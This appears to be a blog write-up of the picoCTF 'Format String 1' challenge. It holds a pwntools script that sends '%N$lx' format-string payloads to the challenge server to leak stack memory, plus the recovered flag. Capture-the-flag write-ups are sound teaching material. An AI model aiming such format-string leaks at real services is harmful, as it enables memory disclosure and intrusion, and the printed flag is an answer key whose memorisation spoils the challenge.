---
title: "Format String 1 (picoCTF 2024)"
summary: "Easy pwn chal - format string vuln"
description: "Easy pwn chal - format string vuln"
tags: [pwn, easy, writeup]
date: 2023-04-23T22:00:00-05:00
draft: false
searchHidden: false
ShowToc: true
TocOpen: false
hidemeta: false
# weight: 1
---

## Description

Patrick and Sponge Bob were really happy with those orders you made for them, but now they're curious about the secret menu. Find it, and along the way, maybe you'll find something else of interest!

Given files: [format-string-1](/picoctf-format-string-1/format-string-1) [format-string-1.c](/picoctf-format-string-1/format-string-1.c)

---

## Writeup



### Solve script

```py
from pwn import *

elf = ELF('./format-string-1')

host = <'host'>
port = <port>
# p = remote(host, port)

s = ""
orders = []
for i in range (14,30):
    p = remote(host, port)
    # p = elf.process()
    format_s = b"".join([b"%" + str(i).encode("utf-8") + b"$lx"])
    p.recvuntil(b":")
    p.sendline(format_s)
    out = p.recvall().decode('utf-8').strip().split(" ")[3].splitlines()[0]
    orders.append(out)

orders.reverse()
print(orders)
print(''.join(orders))
```

## Flag

`picoCTF{4n1m41_57y13_4x4_f14g_e11e8018}`

---